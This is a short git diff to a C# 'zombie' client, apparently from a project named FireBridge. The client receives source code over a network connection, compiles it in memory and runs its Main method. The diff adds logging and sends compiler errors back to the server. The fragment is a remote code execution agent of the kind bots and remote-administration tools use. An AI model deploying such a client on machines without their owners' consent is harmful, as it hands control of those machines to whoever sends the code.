@@ -3,26 +3,21 @@ using FirebridgeShared.Networking;
 using Microsoft.CSharp;
 using System;
 using System.CodeDom.Compiler;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Drawing2D;
-using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace FireBridgeZombie
 {
     class Zombie
     {
-        public const int Revision = 2;
+        public const int Revision = 3;
         Server s;
         DiscoveryServer DiscoveryServer;
 
@@ -55,13 +50,21 @@ namespace FireBridgeZombie
                 case 0: //Message/Command
                     break;
                 case 1: //Run Code
+                    Trace.WriteLine("Got RunCode: " + DateTime.Now + ":" + Environment.StackTrace);
+
                     var code = (MiniProgramModel)packet.Data;
                     CSharpCodeProvider provider = new CSharpCodeProvider();
                     CompilerParameters parameters = new CompilerParameters();
                     parameters.GenerateInMemory = true;
                     parameters.ReferencedAssemblies.AddRange(code.References.ToArray());
                     CompilerResults results = provider.CompileAssemblyFromSource(parameters, code.Code);
-                    results.Errors.Cast<CompilerError>().ToList().ForEach(error => Console.WriteLine(error.ErrorText));
+                    results.Errors.Cast<CompilerError>().ToList().ForEach(error => {
+                        Trace.WriteLine(error.ErrorText);
+                        connection.SendPacket(new Packet() { Id = 0 , Data=error.ErrorText});
+                    });
+
+                    if (results.Errors.Count > 0)
+                        break;
 
                     var cls = results.CompiledAssembly.GetType(code.EntryPoint);
                     var method = cls.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);  
